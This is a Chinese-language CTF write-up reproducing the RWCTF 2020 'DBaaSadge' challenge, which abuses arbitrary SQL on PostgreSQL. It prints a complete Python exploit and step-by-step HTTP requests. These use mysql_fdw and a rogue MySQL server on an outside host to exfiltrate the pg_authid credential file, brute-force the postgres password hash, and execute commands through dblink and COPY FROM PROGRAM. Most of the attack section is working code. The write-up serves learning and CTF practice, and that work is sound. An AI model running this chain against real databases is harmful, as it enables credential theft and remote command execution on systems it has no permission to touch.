---
title: Rwctf 2020
slug: rwctf-2020
description: ""
summary: ""
date: 2026-07-30T18:11:04+08:00
lastmod: 2026-07-30T18:11:04+08:00
author: baozongwi
image: ""
categories:
  - 复现
tags: []
keywords: []
---
## TL;DR

接下来我会抽空复现一些 RWCTF 的题目，还是太想打 CTF 了，学习一些思路，也算是弥补没参加 过 RWCTF 的遗憾了

## DBaaSadge

首先需要注意一点，我本地是 Mac，所以构建环境的 compose 需要换一下
```yml
services:
  web:
    build: .
    platform: linux/amd64
    volumes:
      - ./html/:/var/www/html/
      - ./start.sh:/start.sh
    entrypoint: sh /start.sh
    ports:
      - "60080:80"

```

启动之后就正常测试就行了 
题目给了一个 PostgreSQL 作为数据库服务的场景，Web 端只有一个 PHP 文件，逻辑很简单：从 GET 参数 `sql` 读取一条 SQL 语句，以 `realuser` 身份（并不是最高用户）连接本地 PostgreSQL 并执行，返回结果。限制有两个——SQL 长度不超过 100 字符，以及 `statement_timeout` 被设为 10 秒。

核心的 PHP 逻辑就这些

```php
<?php
error_reporting(0);
if(!$sql=(string)$_GET["sql"]){
  show_source(__FILE__);
  die();
}
header('Content-Type: text/plain');
if(strlen($sql)>100){
  die('That query is too long ;_;');
}
if(!pg_pconnect('dbname=postgres user=realuser')){
  die('DB gone ;_;');
}
if($query = pg_query($sql)){
  print_r(pg_fetch_all($query));
} else {
  die('._.?');
}
```

Dockerfile 里装了 `postgresql-10`、`postgresql-10-mysql-fdw`、`apache2` 和 `php-pgsql`，还建了 `dblink` 和 `mysql_fdw` 两个扩展。`realuser` 是 NOSUPERUSER，但拿到了 `ALL PRIVILEGES ON DATABASE postgres` 和 `GRANT USAGE ON FOREIGN DATA WRAPPER mysql_fdw TO realuser`。这两个权限的作用，简单来说有

- 登录到 `postgres` 数据库。
  
- 利用 `CREATE` 权限建立一个属于自己的新 Schema。
  
- 利用对 `mysql_fdw` 的 `USAGE` 权限，创建一个指向任意 MySQL 数据库的连接。
  
- 建立外部表，从而通过 PostgreSQL 服务器作为跳板，读取或修改内网 MySQL 数据库里的数据。（这个没啥用没用到：
  

超级用户 `postgres` 的密码在 `start.sh` 里被改成了一个 5 字符的随机串：

```bash
su postgres -c "psql -c 'ALTER USER postgres WITH ENCRYPTED PASSWORD \$\$`head /dev/urandom | tr -dc '0-9a-z' | fold -w 5 | head -n1`\$\$;'"
```

字符集是 `[0-9a-z]`，36 个字符，5 位长度，总共 36^5 ≈ 6046 万种组合，完全属于可爆破区间

`start.sh` 还往 `pg_hba.conf` 最前面插了一条 `local all realuser trust`，所以 PHP 用 Unix socket 连 PostgreSQL 不需要密码，但 `postgres` 用户的本地连接走的是默认的 `peer` 认证（用户名一致为 postgres），TCP 连接则走 `md5`。

### 从 realuser 到 postgres：dblink 的障碍

第一反应是用 `dblink` 连本地 PostgreSQL 冒充 postgres。`local all postgres peer` 这条规则意味着，如果连接进程的 OS 用户是 `postgres`（PostgreSQL 后端进程恰好就是），peer 认证就能通过。但 dblink 的源码里有一个关键检查

```c
if (!superuser())
{
    if (!PQconnectionUsedPassword(conn))
    {
        PQfinish(conn);
        ereport(ERROR, ...);
    }
}
```

`PQconnectionUsedPassword` 检查连接是否实际使用了密码认证，peer 认证和 trust 认证都不会需要密码，所以必须走 TCP + md5 认证，而且密码必须正确。

需要获得密码的话，在线爆破不太可能（从未喷洒成功过），那么我们可以拿到密码实际 hash 去做离线爆破。

### mysql_fdw + Rogue MySQL Server 读文件

PostgreSQL 的 `pg_authid` 系统表里存着所有用户的密码哈希，但 `realuser` 没权限查。不过有拓展 `mysql_fdw` ，可以创建指向外部 MySQL 服务器的 foreign server、user mapping 和 foreign table。所以也就可以 Rogue MySQL Server 这类恶意 MySQL server 去实现任意文件读取。

mysql_fdw 连接 MySQL 后，首先发的是 `SET sql_mode='ANSI_QUOTES'`，这是一条普通查询（COM_QUERY，命令字节 `0x03`），不是 prepared statement。这很重要，因为 LOCAL INFILE 只能作为 COM_QUERY 的响应触发。我的 rogue server 就在这条 SET 查询上返回 LOCAL INFILE 请求，目标文件是 `pg_authid` 的数据文件。

和 MySQL 一样，Pgsql 也会进行本地文件转储。

OID = 1260 是 PostgreSQL 源码里硬编码的，定义在 src/include/catalog/pg_authid.h：

```c
#define AuthIdRelationId 1260
```

这个 OID 在所有 PostgreSQL 安装里都一样，或者查询一下，

```sql
SELECT oid FROM pg_class WHERE relname='pg_authid';
```

第一段 /var/lib/postgresql/10/main/ 是数据目录，这是 Debian/Ubuntu 上 PostgreSQL 10 的默认路径，正常情况下`SHOW data_directory`就能看到，但这个命令需要 superuser，realuser 跑不了。

第二段 global/ 是因为 pg_authid 的 relisshared = true。PostgreSQL 把系统表分成两类：每个数据库独享的放在 base/db_oid/ 下，集群级共享的放在 global/ 下。pg_authid 存的是全集群的用户认证信息，自然是共享的。这个信息 realuser 也能查到

```sql
SELECT relisshared FROM pg_class WHERE relname='pg_authid'
# t
```

第三段 1260 作为文件名，PostgreSQL 正常情况下用 relfilenode 字段作为数据文件名，但 pg_authid 的 relfilenode = 0。

这在 PostgreSQL 里是一个特殊类别，叫 mapped catalog——这类系统表的文件位置不记录在 pg_class 里，而是在源码里硬编码映射，文件名直接等于 OID。对比一下就很清楚：

| **表名** | **OID** | **relfilenode** | **表类型** | **物理文件名对应逻辑** |
| --- | --- | --- | --- | --- |
| **`pg_authid`** | 1260 | 0   | mapped catalog（映射系统目录） | **OID** (即文件名为 `1260`) |
| **`pg_shadow`** | 11531 | 11531 | 普通系统表 | **relfilenode** (即文件名为 `11531`) |
| **`pg_user`** | 11538 | 11538 | 普通系统表 | **relfilenode** (即文件名为 `11538`) |

relfilenode = 0 的表在 PostgreSQL 里只有几张：pg_authid、pg_database、pg_tablespace、pg_db_role_setting、pg_shdepend、pg_shseclabel、pg_subscription。这些都是 bootstrap 阶段就要用到、但又不能依赖 pg_class 自身来定位文件位置的表，所以做了特殊处理。所以数据文件在 `/var/lib/postgresql/10/main/global/1260`

### 读取 pg_authid 并爆破密码

通过 Web 接口创建三个对象，每个都不超过 100 字符：

第一个请求创建 foreign server，指向宿主机上跑的 rogue MySQL server。Docker Desktop 环境下容器内可以通过 `host.docker.internal` 访问宿主机：

```
GET /?sql=CREATE+SERVER+s+FOREIGN+DATA+WRAPPER+mysql_fdw+OPTIONS(host+'host.docker.internal',port+'3306') HTTP/1.1
Host: <target>
```

第二个请求创建 user mapping：

```
GET /?sql=CREATE+USER+MAPPING+FOR+realuser+SERVER+s+OPTIONS(username+'a',password+'b') HTTP/1.1
Host: <target>
```

第三个请求创建 foreign table：

```
GET /?sql=CREATE+FOREIGN+TABLE+t(s+text)+SERVER+s+OPTIONS(table_name+'t') HTTP/1.1
Host: <target>
```

然后查询这个 foreign table 触发连接。rogue server 启动时指定目标文件为 `/var/lib/postgresql/10/main/global/1260`，收到连接后就能拿到 8192 字节的 pg_authid 数据文件。这个文件是 PostgreSQL 的二进制堆格式，但密码哈希是明文字符串 `md5` 开头的，直接正则提取就行。

PostgreSQL 的 MD5 密码格式是 `md5` + MD5(password + username)。对 postgres 用户来说就是 `md5` + MD5(password + `postgres`)。

### dblink 提权 + COPY FROM PROGRAM

密码到手后，用 dblink 通过 TCP 连接本地 PostgreSQL（`host=127.0.0.1`），走 md5 认证。这样 `PQconnectionUsedPassword` 返回 true，dblink 的非超级用户检查就能通过。

但这里有个长度问题。最关键的 COPY 查询如果用 `host=127.0.0.1`：

```
SELECT dblink_exec('host=127.0.0.1 user=postgres password=XXXXX','COPY f FROM PROGRAM ''/readflag''')
```

数一下正好 101 字符，超了 1 个。那直接用 `127.1`代替 `127.0.0.1`即可。

第一步建表：

```
GET /?sql=SELECT+dblink_exec('host%3D127.1+user%3Dpostgres+password%3DXXXXX','CREATE+TABLE+f(s+text)') HTTP/1.1
Host: <target>
```

第二步用 COPY FROM PROGRAM 执行 /readflag，输出写入表中：

```
GET /?sql=SELECT+dblink_exec('host%3D127.1+user%3Dpostgres+password%3DXXXXX','COPY+f+FROM+PROGRAM+''/readflag''') HTTP/1.1
Host: <target>
```

第三步读出 flag：

```
GET /?sql=SELECT+*+FROM+dblink('host%3D127.1+user%3Dpostgres+password%3DXXXXX','SELECT+s+FROM+f')+AS+t(s+text) HTTP/1.1
Host: <target>
```

dblink_exec 每次创建匿名连接，执行完就断开，但表是持久化的，所以三步分别用独立连接没问题。表 `f` 归 postgres 所有，但第三步通过 dblink 以 postgres 身份查询，不存在权限问题。`COPY f FROM PROGRAM '/readflag'` 以后端 postgres 用户身份 fork 出 shell 执行 `/readflag`。

不过我看网上的 WP 倒是很多打 UDF 提权到高权限用户的，而且需要注意 Pgsql 2048 字符自动以 0 补全的细节问题

### Exploit

exp 如下

```python
#!/usr/bin/env python3
import hashlib
import itertools
import re
import socket
import string
import struct
import sys
import threading
import time
import urllib.parse
import urllib.request


def mysql_packet(payload, seq):
    return struct.pack("<I", len(payload))[:3] + struct.pack("B", seq) + payload


def read_mysql_packet(conn):
    header = b""
    while len(header) < 4:
        chunk = conn.recv(4 - len(header))
        if not chunk:
            return None, None
        header += chunk
    length = struct.unpack("<I", header[:3] + b"\x00")[0]
    seq = header[3]
    if length == 0:
        return b"", seq
    data = b""
    while len(data) < length:
        chunk = conn.recv(length - len(data))
        if not chunk:
            return None, None
        data += chunk
    return data, seq


def rogue_mysql_server(port, target_file, result):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    srv.settimeout(30)
    try:
        conn, _ = srv.accept()
    except socket.timeout:
        srv.close()
        return

    caps = 1 | 2 | 4 | 8 | 128 | 512 | 8192 | 32768 | 0x10000 | 0x20000 | 0x80000
    greeting = b"\x0a" + b"5.7.42\x00" + struct.pack("<I", 1)
    greeting += b"\x01\x02\x03\x04\x05\x06\x07\x08" + b"\x00"
    greeting += struct.pack("<H", caps & 0xFFFF) + b"\x21"
    greeting += struct.pack("<H", 0x0002) + struct.pack("<H", (caps >> 16) & 0xFFFF)
    greeting += b"\x15" + b"\x00" * 10
    greeting += b"\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x00"
    greeting += b"mysql_native_password\x00"
    conn.sendall(mysql_packet(greeting, 0))

    payload, seq = read_mysql_packet(conn)
    if payload is None:
        conn.close()
        srv.close()
        return

    ok = b"\x00\x00\x00" + struct.pack("<H", 0x0002) + struct.pack("<H", 0)
    conn.sendall(mysql_packet(ok, seq + 1))

    while True:
        payload, seq = read_mysql_packet(conn)
        if payload is None or len(payload) == 0:
            break
        if payload[0] == 3:
            conn.sendall(mysql_packet(b"\xfb" + target_file.encode(), seq + 1))
            file_data = b""
            while True:
                fp, fseq = read_mysql_packet(conn)
                if fp is None or len(fp) == 0:
                    break
                file_data += fp
            conn.sendall(mysql_packet(ok, fseq + 1))
            if file_data:
                result["data"] = file_data
            break
        elif payload[0] == 1:
            break
        else:
            conn.sendall(mysql_packet(ok, seq + 1))

    conn.close()
    srv.close()


def crack_postgres_password(md5_hash):
    target = md5_hash[3:]
    charset = string.digits + string.ascii_lowercase
    for combo in itertools.product(charset, repeat=5):
        pw = "".join(combo)
        if hashlib.md5((pw + "postgres").encode()).hexdigest() == target:
            return pw
    return None


def sql_query(base_url, sql):
    url = base_url + "?" + urllib.parse.urlencode({"sql": sql})
    with urllib.request.urlopen(url, timeout=15) as resp:
        return resp.read().decode("utf-8", "replace")


def main():
    if len(sys.argv) < 3:
        print("usage: exp.py <target_url> <mysql_host>")
        sys.exit(1)
    base_url = sys.argv[1].rstrip("/")
    mysql_host = sys.argv[2]

    rogue_port = 13306
    pg_authid_path = "/var/lib/postgresql/10/main/global/1260"
    result = {}

    server_thread = threading.Thread(
        target=rogue_mysql_server, args=(rogue_port, pg_authid_path, result)
    )
    server_thread.daemon = True
    server_thread.start()
    time.sleep(0.3)

    sql_query(base_url, "DROP FOREIGN TABLE IF EXISTS t")
    sql_query(base_url, "DROP USER MAPPING IF EXISTS FOR realuser SERVER s")
    sql_query(base_url, "DROP SERVER IF EXISTS s")
    sql_query(
        base_url,
        "CREATE SERVER s FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host '%s',port '%d')"
        % (mysql_host, rogue_port),
    )
    sql_query(
        base_url,
        "CREATE USER MAPPING FOR realuser SERVER s OPTIONS(username 'a',password 'b')",
    )
    sql_query(
        base_url, "CREATE FOREIGN TABLE t(s text) SERVER s OPTIONS(table_name 't')"
    )

    sql_query(base_url, "SELECT * FROM t")
    server_thread.join(timeout=5)

    if "data" not in result:
        print("[-] failed to read pg_authid")
        sys.exit(1)

    matches = re.findall(rb"md5[0-9a-f]{32}", result["data"])
    if not matches:
        print("[-] no md5 hash found in pg_authid")
        sys.exit(1)

    pg_hash = matches[0].decode()
    password = crack_postgres_password(pg_hash)
    if not password:
        print("[-] failed to crack password")
        sys.exit(1)

    conn_str = "host=127.1 user=postgres password=%s" % password

    sql_query(base_url, "DROP TABLE IF EXISTS f")
    sql_query(base_url, "SELECT dblink_exec('%s','CREATE TABLE f(s text)')" % conn_str)
    sql_query(
        base_url,
        "SELECT dblink_exec('%s','COPY f FROM PROGRAM ''/readflag''')" % conn_str,
    )
    flag = sql_query(
        base_url,
        "SELECT * FROM dblink('%s','SELECT s FROM f') AS t(s text)" % conn_str,
    )
    print(flag)


if __name__ == "__main__":
    main()


# python3 exp.py http://localhost:60080 host.docker.internal
```

![](assets/001.png)

`mysql_host` 是目标 PostgreSQL 能访问到的 rogue MySQL server 的地址，实际比赛中就是自己 VPS 的公网 IP，本地 Docker Desktop 复现时传 `host.docker.internal`。

`host=127.1` 这个技巧依赖 `getaddrinfo` 把 `127.1` 解析成 `127.0.0.1`，在大多数 Linux 环境下没问题。但是如果目标环境不支持，也有很多办法，比如把表名缩成单字符、用 `dblink` 代替 `dblink_exec` 省掉 `_exec` 等。

